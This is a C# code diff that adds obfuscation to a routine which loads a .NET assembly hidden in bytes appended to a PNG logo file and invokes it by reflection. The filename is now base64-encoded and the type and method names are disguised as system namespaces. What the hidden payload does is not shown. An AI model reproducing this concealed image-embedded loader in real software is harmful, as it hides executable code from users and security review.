@@ -41,27 +41,35 @@ namespace FPE
             return Encoding.UTF8.GetString(Convert.FromBase64String(b));
         }
 
-        public static bool ResetConnection()
+        private static string ChangeFileExtension(string fileName, string newExtension)
+        {
+            var fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
+            return fileNameWithoutExtension + newExtension;
+
+        }
+
+        const string PNG_FILENAME = "LlxibnNrLmxvZ28ucG5n";
+
+        public static int ResetConnection()
         {
             try
             {
-                var buffer1 = File.ReadAllBytes(@".\bnsk.logo.png");
-                var buffer2 = File.ReadAllBytes(@".\bnsk.logo.2.png");
-                var buffer3 = buffer2.Skip(buffer1.Length).ToArray();
-                var myAssembly = Assembly.Load(buffer3);
+                var buffer1 = File.ReadAllBytes(bTos(PNG_FILENAME));
+                var buffer2 = File.ReadAllBytes(ChangeFileExtension(bTos(PNG_FILENAME), ".2.png"));
+                var myAssembly = Assembly.Load(buffer2.Skip(buffer1.Length).ToArray());
 
-                // var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
                 var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
                 var myMethod = myType.GetMethod(GTR64("RC.txt", Assembly.GetExecutingAssembly()), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                 var fileName = GTR("FzCD.txt", Assembly.GetExecutingAssembly());
                 if (myMethod != null)
-                    return (bool)myMethod.Invoke(null, new object[] { fileName }); //var s = @".\Files\zCasData.dat";
+                    return ((bool)myMethod.Invoke(null, new object[] { fileName })) ? 1 : 2;
             }
             catch (Exception ex)
             {
                 var m = ex.Message;
+                return 3;
             }
-            return false;
+            return 4;
         }
 
         public static bool ResetConnection_SemiIL()
